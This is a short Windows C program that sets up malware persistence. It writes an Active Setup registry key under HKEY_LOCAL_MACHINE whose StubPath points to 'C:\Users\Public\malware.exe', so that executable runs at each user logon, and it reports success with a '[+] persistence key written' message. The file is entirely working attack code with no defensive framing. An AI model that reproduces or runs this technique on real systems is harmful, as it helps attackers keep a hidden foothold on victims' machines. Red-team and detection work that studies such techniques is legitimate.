#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    LPCSTR path = "Software\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}";
    LPCSTR stubPathName = "StubPath"; // StubPath type REG_SZ version should look like "d,d,d,d" where d should be a number
    LPCSTR exePath = "C:\\Users\\Public\\malware.exe";
    LPCSTR versionName = "Version";
    LPCSTR versionValue = "1,0,0,0";

    // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, path, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create/open key: %ld\n", result);
        return 1;
    }

    // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
    result = RegSetValueExA(hKey, stubPathName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set StubPath value: %ld\n", result);
        RegCloseKey(hKey);
        return 1;
    }

    result = RegSetValueExA(hKey, versionName, 0, REG_SZ, (const BYTE*)versionValue, strlen(versionValue) + 1);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set Version value: %ld\n", result);
    }

    printf("[+] Active Setup persistence key written successfully.\n");

    RegCloseKey(hKey);
    return 0;
}
